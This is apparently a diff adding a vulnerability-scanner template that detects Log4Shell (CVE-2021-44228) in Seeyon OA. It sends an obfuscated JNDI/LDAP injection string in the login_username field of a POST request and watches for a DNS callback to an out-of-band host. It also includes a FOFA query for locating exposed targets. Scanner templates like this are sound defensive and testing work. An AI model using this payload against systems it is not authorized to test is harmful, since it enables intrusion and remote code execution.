@@ -1,0 +1,44 @@
+id: seeyon-oa-log4j
+
+info:
+  name: Seeyon OA (Log4j) - Remote Code Execution
+  author: SleepingBag945
+  severity: critical
+  description: |
+    Seeyon OA is susceptible to remote code execution via the Apache Log4j 2 library prior to 2.15.0 by recording its own log information, specifically with specially crafted values sent as user input. Apache Log4j2 2.0-beta9 through 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1) JNDI features used in configuration, log messages, and parameters do not protect against attacker-controlled LDAP and other JNDI-related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled.
+  reference:
+    - https://github.com/achuna33/MYExploit/blob/8ffbf7ee60cbd77ad90b0831b93846aba224ab29/src/main/java/com/achuna33/Controllers/SeeyonController.java
+    - https://blog.csdn.net/xd_2021/article/details/122232463
+    - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10
+    cve-id: CVE-2021-44228
+    cwe-id: CWE-77
+    cpe: cpe:2.3:a:apache:log4j:*:*:*:*:*:*:*:*
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: app="致远互联-OA"
+    product: log4j
+    vendor: apache
+  tags: cve,cve2021,rce,jndi,log4j,seeyon-oa,kev,oast
+
+http:
+  - raw:
+      - |
+        POST /seeyon/main.do?method=login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        authorization=&login.timezone=GMT+8:00&province=&city=&rectangle=&login_username=${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://{{interactsh-url}}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "len(body) == 0"
+          - "status_code == 302"
+          - 'contains(interactsh_protocol, "dns")'
+          - "contains(tolower(header), '/seeyon/main.do')"
+        condition: and
+# digest: 490a0046304402205fa237518f299b5a606a7b4b715654152e02fb63974dac14f555869089747378022017d6d53603a31c498f5a7beca81c84a7e74d63611ffedbaa9fac1d3b5f0cc206:922c64590222798bb761d5b6d8e72950
